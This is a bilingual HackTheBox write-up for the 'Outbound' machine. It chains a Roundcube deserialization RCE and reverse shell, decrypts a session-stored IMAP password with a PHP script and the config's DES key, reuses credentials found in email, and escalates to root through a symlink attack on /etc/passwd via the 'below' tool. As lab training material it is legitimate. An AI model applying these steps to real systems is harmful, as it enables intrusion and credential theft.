@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>outbound | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">outbound</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a vulnerable version of Roundcube webmail that was susceptible to CVE-2025-49113, a PHP object deserialization vulnerability in the file upload endpoint. After verifying the vulnerability using a PoC exploit, I gained initial access as <code>www-data</code> by uploading a malicious payload that triggered a reverse shell.</p>
+                    
+                    <p>Once inside the Docker container, I discovered Roundcube's database configuration containing MySQL credentials. Although the database didn't store user passwords directly (IMAP handles authentication), I was able to escalate to user <code>tyler</code> using provided credentials. From there, I extracted an encrypted IMAP session from the MySQL sessions table belonging to user <code>jacob</code>. By decrypting this session using Roundcube's DES key from the configuration file, I obtained Jacob's password and accessed his email account.</p>
+                    
+                    <p>Jacob's inbox contained an email from <code>mel</code> with SSH credentials for the real host machine (outside the container). After SSH access to the actual system, I discovered that <code>jacob</code> had sudo permissions to run the <code>below</code> monitoring tool. Exploiting CVE-2025-27591, a symlink attack vulnerability in <code>below</code>, I created a symbolic link from <code>/var/log/below/error_root.log</code> to <code>/etc/passwd</code> and forced <code>below</code> to write a malicious user entry with root privileges, achieving full system compromise.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Roundcube RCE via PHP object deserialization (CVE-2025-49113), DES encryption cracking using hardcoded keys, IMAP session hijacking, privilege escalation via <code>below</code> symlink attack (CVE-2025-27591).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Before starting the machine, HackTheBox provides initial credentials in the machine information:</p>
+                <blockquote>
+                    <p>As is common in real life pentests, you will start the Outbound box with credentials for the following account: <code>tyler / LhKL1o9Nm3X2</code></p>
+                </blockquote>
+
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals HTTP services running. I add <code>outbound.htb</code> and <code>mail.outbound.htb</code> to my <code>/etc/hosts</code> file for proper hostname resolution.</p>
+
+                <h2>Web Enumeration - Roundcube Webmail</h2>
+                <p>Navigating to the web service, I encounter a Roundcube webmail login interface:</p>
+                <p><img src="./media/image10.png" alt="Roundcube webmail login page" /></p>
+                <p><img src="./media/image5.png" alt="Roundcube webmail interface details" /></p>
+
+                <p>Directory enumeration with <code>gobuster</code> doesn't reveal anything particularly interesting beyond the standard Roundcube structure, so I shift focus to researching known vulnerabilities for this application.</p>
+
+                <h2>Vulnerability Research - CVE-2025-49113</h2>
+                <p>Searching for "roundcube exploit" reveals a very recent RCE vulnerability from just three months ago: <strong>CVE-2025-49113</strong>. I find detailed information at the Canadian Centre for Cyber Security: <a href="https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113">https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113</a></p>
+
+                <p>A proof-of-concept exploit is available on GitHub: <a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a></p>
+
+                <h3>Exploiting Roundcube RCE</h3>
+                <p>I clone the repository and execute the PHP exploit script. The script confirms that the target Roundcube version is vulnerable:</p>
+                <p><img src="./media/image9.png" alt="Exploit script confirming vulnerability in target Roundcube version" /></p>
+                <p><img src="./media/image7.png" alt="Successful exploitation confirmation message" /></p>
+
+                <p>The vulnerability exploits insecure PHP object deserialization in the file upload endpoint. By crafting a malicious serialized object, I can achieve remote code execution on the server.</p>
+
+                <h2>Initial Access - Reverse Shell as www-data</h2>
+                <p>I modify the exploit to deliver a reverse shell payload instead of the default proof-of-concept. Setting up a netcat listener on my machine:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>After triggering the exploit, I successfully receive a reverse shell connection as the <code>www-data</code> user. This grants me access to the Roundcube application's Docker container environment.</p>
+
+                <h2>Container Enumeration and Lateral Movement</h2>
+                <p>Exploring the system, I discover three users in the <code>/home</code> directory:</p>
+                <p><img src="./media/image1.png" alt="Home directory listing showing three users: tyler, mel, and jacob" /></p>
+
+                <p>Investigating the Roundcube application files, I find the database configuration with MySQL credentials in the config file:</p>
+                <pre><code class="language-php">$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';</code></pre>
+
+                <p>Connecting to the MySQL database, I can see all three users in the database. However, Roundcube doesn't store passwords directly—it only acts as a frontend while an IMAP server (Dovecot) handles authentication.</p>
+
+                <h3>Escalating to User Tyler</h3>
+                <p>Attempting SSH access from outside the machine with <code>tyler:LhKL1o9Nm3X2</code> fails, but from within the container, I can successfully switch users:</p>
+                <pre><code class="language-bash">su tyler</code></pre>
+
+                <p>Using the credentials provided by HTB (<code>LhKL1o9Nm3X2</code>), I successfully escalate to the <code>tyler</code> user.</p>
+
+                <h2>IMAP Investigation and Session Decryption</h2>
+                <p>In Tyler's home directory, I notice an <code>.imap</code> directory containing Dovecot-related files. Dovecot is an IMAP server that handles the actual email storage and authentication.</p>
+
+                <p>Examining the mail directories, I find that <code>jacob</code> appears to be the owner of several Dovecot-related files:</p>
+                <p><img src="./media/image3.png" alt="Dovecot file structure showing jacob as owner of mail-related files" /></p>
+
+                <p>I attempt to brute-force SSH credentials for <code>jacob</code> and <code>mel</code> using Hydra with the rockyou wordlist, but this proves unsuccessful and I abandon this approach.</p>
+
+                <h3>Extracting and Decrypting Session Data</h3>
+                <p>Returning to the Roundcube configuration file, I notice an important detail I had previously overlooked:</p>
+                <pre><code class="language-php">// This key is used to encrypt the users imap password which is stored
+// in the session record. For the default cipher method it must be
+// exactly 24 characters long.
+// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code></pre>
+
+                <p>The configuration reveals that user passwords are encrypted and stored in session records. I query the MySQL <code>session</code> table and find session attributes stored in base64. Decoding a session belonging to <code>jacob</code> reveals this encrypted password:</p>
+                <pre><code class="language-plaintext">L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code></pre>
+
+                <p>To decrypt this password, I create a PHP script based on Roundcube's encryption implementation from <a href="https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php">the official Roundcube repository</a>:</p>
+                <pre><code class="language-php">&lt;?php
+$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
+$des_key = 'rcmail-!24ByteDESkey*Str';
+
+function decrypt($data, $key) {
+    $cipher = 'des-ede3-cbc';
+    $data = base64_decode($data);
+    $ivlen = openssl_cipher_iv_length($cipher);
+    $iv = substr($data, 0, $ivlen);
+    $ciphertext = substr($data, $ivlen);
+    return openssl_decrypt($ciphertext, $cipher, $key, OPENSSL_RAW_DATA, $iv);
+}
+
+$decrypted = decrypt($encrypted, $des_key);
+echo "$decrypted";
+?&gt;</code></pre>
+
+                <p>Running this script successfully decrypts Jacob's password: <code>595mO8DmwGeD</code></p>
+
+                <h2>Accessing Jacob's Email Account</h2>
+                <p>Using the decrypted credentials, I log into Jacob's Roundcube webmail account and discover two important emails.</p>
+
+                <p>First, an email from Tyler:</p>
+                <p><img src="./media/image6.png" alt="Email from Tyler to Jacob discussing system administration tasks" /></p>
+
+                <p>More importantly, an email from Mel containing SSH credentials:</p>
+                <p><img src="./media/image2.png" alt="Email from Mel to Jacob containing SSH credentials for the host machine" /></p>
+
+                <p>The email reveals Jacob's SSH password for the actual host machine (not the container): <code>gY4Wr3a1evp4</code></p>
+
+                <h2>Breaking Out of the Container</h2>
+                <p>Up until this point, all access has been within a Docker container running the Roundcube application. Using the credentials from Mel's email, I successfully SSH into the real host machine:</p>
+                <pre><code class="language-bash">ssh jacob@outbound.htb</code></pre>
+
+                <p>After authenticating with the password <code>gY4Wr3a1evp4</code>, I gain access to the actual system and can retrieve Jacob's user flag:</p>
+                <p><img src="./media/image11.png" alt="Successfully retrieving Jacob's user flag from the home directory" /></p>
+
+                <h2>Privilege Escalation - Below Monitoring Tool</h2>
+                <p>Checking Jacob's sudo privileges reveals an interesting permission:</p>
+                <p><img src="./media/image8.png" alt="Sudo -l output showing jacob can run /usr/bin/below as root" /></p>
+
+                <p>Jacob can execute the <code>below</code> system monitoring tool as root without a password. I run <code>ss -tuln</code> to check for internal services and confirm that Roundcube is running locally on port 5000, but this is just the same container service we already exploited.</p>
+
+                <p>Checking group memberships, I notice Jacob belongs to the <code>users</code> group:</p>
+                <p><img src="./media/image13.png" alt="Groups command showing jacob is member of users group" /></p>
+
+                <h3>Finding CVE-2025-27591</h3>
+                <p>Although I can't easily determine the exact version of <code>below</code> with the tool itself, searching for vulnerabilities reveals a very recent exploit (published January 7, 2025) affecting versions below v0.90: <strong>CVE-2025-27591</strong></p>
+
+                <p>References:</p>
+                <ul>
+                    <li><a href="https://sploitus.com/exploit?id=B09EE953-7AA3-5268-8B76-7694E59E45F6">https://sploitus.com/exploit?id=B09EE953-7AA3-5268-8B76-7694E59E45F6</a></li>
+                    <li><a href="https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh">https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh</a></li>
+                </ul>
+
+                <h3>Understanding the Symlink Attack</h3>
+                <p>The vulnerability exploits the fact that <code>below</code> writes to the log file <code>/var/log/below/error_root.log</code> when run with sudo. The attack works by:</p>
+                <ol>
+                    <li>Creating a symbolic link from <code>/var/log/below/error_root.log</code> to <code>/etc/passwd</code></li>
+                    <li>Preparing a malicious user entry with root privileges (UID 0)</li>
+                    <li>Executing <code>below</code> with sudo, which causes it to write to the symlinked file</li>
+                    <li>The write operation follows the symlink and modifies <code>/etc/passwd</code>, adding the malicious root user</li>
+                </ol>
+
+                <h3>Executing the Privilege Escalation</h3>
+                <p>I download the exploit script from GitHub to my attacking machine and transfer it to the target:</p>
+                <pre><code class="language-bash">wget https://raw.githubusercontent.com/obamalaolu/CVE-2025-27591/main/CVE-2025-27591.sh
+chmod +x CVE-2025-27591.sh</code></pre>
+
+                <p>Running the exploit script on the target machine:</p>
+                <p><img src="./media/image12.png" alt="Successful privilege escalation to root using the below exploit" /></p>
+
+                <p>The exploit successfully creates a new root user in <code>/etc/passwd</code>. I can now switch to this user or directly access root, gaining full control of the system and retrieving the root flag.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una versión vulnerable de Roundcube webmail susceptible a CVE-2025-49113, una vulnerabilidad de deserialización de objetos PHP en el endpoint de subida de archivos. Tras verificar la vulnerabilidad usando un exploit PoC, conseguí acceso inicial como <code>www-data</code> subiendo un payload malicioso que desencadenó una reverse shell.</p>
+                    
+                    <p>Una vez dentro del contenedor Docker, descubrí la configuración de base de datos de Roundcube que contenía credenciales de MySQL. Aunque la base de datos no almacenaba contraseñas de usuarios directamente (IMAP maneja la autenticación), pude escalar al usuario <code>tyler</code> usando credenciales proporcionadas. Desde allí, extraje una sesión IMAP encriptada de la tabla de sesiones MySQL perteneciente al usuario <code>jacob</code>. Descifrando esta sesión usando la clave DES de Roundcube del archivo de configuración, obtuve la contraseña de Jacob y accedí a su cuenta de correo.</p>
+                    
+                    <p>La bandeja de entrada de Jacob contenía un correo de <code>mel</code> con credenciales SSH para la máquina host real (fuera del contenedor). Tras acceder por SSH al sistema real, descubrí que <code>jacob</code> tenía permisos sudo para ejecutar la herramienta de monitorización <code>below</code>. Explotando CVE-2025-27591, una vulnerabilidad de ataque por enlace simbólico en <code>below</code>, creé un enlace simbólico desde <code>/var/log/below/error_root.log</code> a <code>/etc/passwd</code> y forcé a <code>below</code> a escribir una entrada de usuario maliciosa con privilegios root, logrando el compromiso total del sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Roundcube RCE mediante deserialización de objetos PHP (CVE-2025-49113), cracking de encriptación DES usando claves hardcodeadas, secuestro de sesiones IMAP, escalada de privilegios mediante ataque por symlink en <code>below</code> (CVE-2025-27591).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Antes de comenzar la máquina, HackTheBox proporciona credenciales iniciales en la información de la máquina:</p>
+                <blockquote>
+                    <p>Como es común en pentests de la vida real, comenzaréis la máquina Outbound con credenciales para la siguiente cuenta: <code>tyler / LhKL1o9Nm3X2</code></p>
+                </blockquote>
+
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela servicios HTTP en ejecución. Añado <code>outbound.htb</code> y <code>mail.outbound.htb</code> a mi archivo <code>/etc/hosts</code> para la resolución adecuada de nombres de host.</p>
+
+                <h2>Enumeración Web - Roundcube Webmail</h2>
+                <p>Navegando al servicio web, me encuentro con una interfaz de login de Roundcube webmail:</p>
+                <p><img src="./media/image10.png" alt="Página de login de Roundcube webmail" /></p>
+                <p><img src="./media/image5.png" alt="Detalles de la interfaz de Roundcube webmail" /></p>
+
+                <p>La enumeración de directorios con <code>gobuster</code> no revela nada particularmente interesante más allá de la estructura estándar de Roundcube, así que cambio el enfoque a investigar vulnerabilidades conocidas para esta aplicación.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2025-49113</h2>
+                <p>Buscando "roundcube exploit" descubro una vulnerabilidad RCE muy reciente de hace solo tres meses: <strong>CVE-2025-49113</strong>. Encuentro información detallada en el Centro Canadiense de Ciberseguridad: <a href="https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113">https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113</a></p>
+
+                <p>Hay disponible un exploit de prueba de concepto en GitHub: <a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a></p>
+
+                <h3>Explotando el RCE de Roundcube</h3>
+                <p>Clono el repositorio y ejecuto el script de exploit PHP. El script confirma que la versión de Roundcube objetivo es vulnerable:</p>
+                <p><img src="./media/image9.png" alt="Script del exploit confirmando la vulnerabilidad en la versión de Roundcube objetivo" /></p>
+                <p><img src="./media/image7.png" alt="Mensaje de confirmación de explotación exitosa" /></p>
+
+                <p>La vulnerabilidad explota la deserialización insegura de objetos PHP en el endpoint de subida de archivos. Diseñando un objeto serializado malicioso, puedo conseguir ejecución remota de código en el servidor.</p>
+
+                <h2>Acceso Inicial - Reverse Shell como www-data</h2>
+                <p>Modifico el exploit para entregar un payload de reverse shell en lugar de la prueba de concepto predeterminada. Configurando un listener de netcat en mi máquina:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Tras desencadenar el exploit, recibo exitosamente una conexión de reverse shell como usuario <code>www-data</code>. Esto me concede acceso al entorno del contenedor Docker de la aplicación Roundcube.</p>
+
+                <h2>Enumeración del Contenedor y Movimiento Lateral</h2>
+                <p>Explorando el sistema, descubro tres usuarios en el directorio <code>/home</code>:</p>
+                <p><img src="./media/image1.png" alt="Listado del directorio home mostrando tres usuarios: tyler, mel y jacob" /></p>
+
+                <p>Investigando los archivos de la aplicación Roundcube, encuentro la configuración de base de datos con credenciales de MySQL en el archivo de configuración:</p>
+                <pre><code class="language-php">$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';</code></pre>
+
+                <p>Conectándome a la base de datos MySQL, puedo ver los tres usuarios en la base de datos. Sin embargo, Roundcube no almacena contraseñas directamente—solo actúa como frontend mientras un servidor IMAP (Dovecot) maneja la autenticación.</p>
+
+                <h3>Escalando al Usuario Tyler</h3>
+                <p>Intentar acceso SSH desde fuera de la máquina con <code>tyler:LhKL1o9Nm3X2</code> falla, pero desde dentro del contenedor, puedo cambiar de usuario exitosamente:</p>
+                <pre><code class="language-bash">su tyler</code></pre>
+
+                <p>Usando las credenciales proporcionadas por HTB (<code>LhKL1o9Nm3X2</code>), escalo exitosamente al usuario <code>tyler</code>.</p>
+
+                <h2>Investigación IMAP y Descifrado de Sesiones</h2>
+                <p>En el directorio home de Tyler, noto un directorio <code>.imap</code> que contiene archivos relacionados con Dovecot. Dovecot es un servidor IMAP que maneja el almacenamiento real de correo electrónico y la autenticación.</p>
+
+                <p>Examinando los directorios de correo, encuentro que <code>jacob</code> parece ser el propietario de varios archivos relacionados con Dovecot:</p>
+                <p><img src="./media/image3.png" alt="Estructura de archivos Dovecot mostrando a jacob como propietario de archivos relacionados con correo" /></p>
+
+                <p>Intento fuerza bruta de credenciales SSH para <code>jacob</code> y <code>mel</code> usando Hydra con el diccionario rockyou, pero esto resulta infructuoso y abandono este enfoque.</p>
+
+                <h3>Extrayendo y Descifrando Datos de Sesión</h3>
+                <p>Volviendo al archivo de configuración de Roundcube, noto un detalle importante que había pasado por alto anteriormente:</p>
+                <pre><code class="language-php">// This key is used to encrypt the users imap password which is stored
+// in the session record. For the default cipher method it must be
+// exactly 24 characters long.
+// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code></pre>
+
+                <p>La configuración revela que las contraseñas de usuario se cifran y almacenan en registros de sesión. Consulto la tabla <code>session</code> de MySQL y encuentro atributos de sesión almacenados en base64. Decodificando una sesión perteneciente a <code>jacob</code> revela esta contraseña cifrada:</p>
+                <pre><code class="language-plaintext">L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code></pre>
+
+                <p>Para descifrar esta contraseña, creo un script PHP basándome en la implementación de cifrado de Roundcube del <a href="https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php">repositorio oficial de Roundcube</a>:</p>
+                <pre><code class="language-php">&lt;?php
+$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
+$des_key = 'rcmail-!24ByteDESkey*Str';
+
+function decrypt($data, $key) {
+    $cipher = 'des-ede3-cbc';
+    $data = base64_decode($data);
+    $ivlen = openssl_cipher_iv_length($cipher);
+    $iv = substr($data, 0, $ivlen);
+    $ciphertext = substr($data, $ivlen);
+    return openssl_decrypt($ciphertext, $cipher, $key, OPENSSL_RAW_DATA, $iv);
+}
+
+$decrypted = decrypt($encrypted, $des_key);
+echo "$decrypted";
+?&gt;</code></pre>
+
+                <p>Ejecutando este script descifro exitosamente la contraseña de Jacob: <code>595mO8DmwGeD</code></p>
+
+                <h2>Accediendo a la Cuenta de Correo de Jacob</h2>
+                <p>Usando las credenciales descifradas, inicio sesión en la cuenta de webmail Roundcube de Jacob y descubro dos correos importantes.</p>
+
+                <p>Primero, un correo de Tyler:</p>
+                <p><img src="./media/image6.png" alt="Correo de Tyler a Jacob discutiendo tareas de administración del sistema" /></p>
+
+                <p>Más importante, un correo de Mel conteniendo credenciales SSH:</p>
+                <p><img src="./media/image2.png" alt="Correo de Mel a Jacob conteniendo credenciales SSH para la máquina host" /></p>
+
+                <p>El correo revela la contraseña SSH de Jacob para la máquina host real (no el contenedor): <code>gY4Wr3a1evp4</code></p>
+
+                <h2>Saliendo del Contenedor</h2>
+                <p>Hasta este punto, todo el acceso ha sido dentro de un contenedor Docker ejecutando la aplicación Roundcube. Usando las credenciales del correo de Mel, hago SSH exitosamente a la máquina host real:</p>
+                <pre><code class="language-bash">ssh jacob@outbound.htb</code></pre>
+
+                <p>Tras autenticarme con la contraseña <code>gY4Wr3a1evp4</code>, obtengo acceso al sistema real y puedo recuperar la flag de usuario de Jacob:</p>
+                <p><img src="./media/image11.png" alt="Recuperando exitosamente la flag de usuario de Jacob del directorio home" /></p>
+
+                <h2>Escalada de Privilegios - Herramienta de Monitorización Below</h2>
+                <p>Comprobando los privilegios sudo de Jacob revela un permiso interesante:</p>
+                <p><img src="./media/image8.png" alt="Salida de sudo -l mostrando que jacob puede ejecutar /usr/bin/below como root" /></p>
+
+                <p>Jacob puede ejecutar la herramienta de monitorización del sistema <code>below</code> como root sin contraseña. Ejecuto <code>ss -tuln</code> para comprobar servicios internos y confirmo que Roundcube está ejecutándose localmente en el puerto 5000, pero este es solo el mismo servicio del contenedor que ya explotamos.</p>
+
+                <p>Comprobando las membresías de grupo, noto que Jacob pertenece al grupo <code>users</code>:</p>
+                <p><img src="./media/image13.png" alt="Comando groups mostrando que jacob es miembro del grupo users" /></p>
+
+                <h3>Encontrando CVE-2025-27591</h3>
+                <p>Aunque no puedo determinar fácilmente la versión exacta de <code>below</code> con la herramienta en sí, buscar vulnerabilidades revela un exploit muy reciente (publicado el 7 de enero de 2025) que afecta a versiones inferiores a v0.90: <strong>CVE-2025-27591</strong></p>
+
+                <p>Referencias:</p>
+                <ul>
+                    <li><a href="https://sploitus.com/exploit?id=B09EE953-7AA3-5268-8B76-7694E59E45F6">https://sploitus.com/exploit?id=B09EE953-7AA3-5268-8B76-7694E59E45F6</a></li>
+                    <li><a href="https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh">https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh</a></li>
+                </ul>
+
+                <h3>Entendiendo el Ataque por Enlace Simbólico</h3>
+                <p>La vulnerabilidad explota el hecho de que <code>below</code> escribe en el archivo de log <code>/var/log/below/error_root.log</code> cuando se ejecuta con sudo. El ataque funciona mediante:</p>
+                <ol>
+                    <li>Crear un enlace simbólico desde <code>/var/log/below/error_root.log</code> a <code>/etc/passwd</code></li>
+                    <li>Preparar una entrada de usuario maliciosa con privilegios root (UID 0)</li>
+                    <li>Ejecutar <code>below</code> con sudo, lo que hace que escriba en el archivo enlazado simbólicamente</li>
+                    <li>La operación de escritura sigue el enlace simbólico y modifica <code>/etc/passwd</code>, añadiendo el usuario root malicioso</li>
+                </ol>
+
+                <h3>Ejecutando la Escalada de Privilegios</h3>
+                <p>Descargo el script del exploit desde GitHub a mi máquina atacante y lo transfiero al objetivo:</p>
+                <pre><code class="language-bash">wget https://raw.githubusercontent.com/obamalaolu/CVE-2025-27591/main/CVE-2025-27591.sh
+chmod +x CVE-2025-27591.sh</code></pre>
+
+                <p>Ejecutando el script del exploit en la máquina objetivo:</p>
+                <p><img src="./media/image12.png" alt="Escalada de privilegios exitosa a root usando el exploit de below" /></p>
+
+                <p>El exploit crea exitosamente un nuevo usuario root en <code>/etc/passwd</code>. Ahora puedo cambiar a este usuario o acceder directamente como root, obteniendo control total del sistema y recuperando la flag de root.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
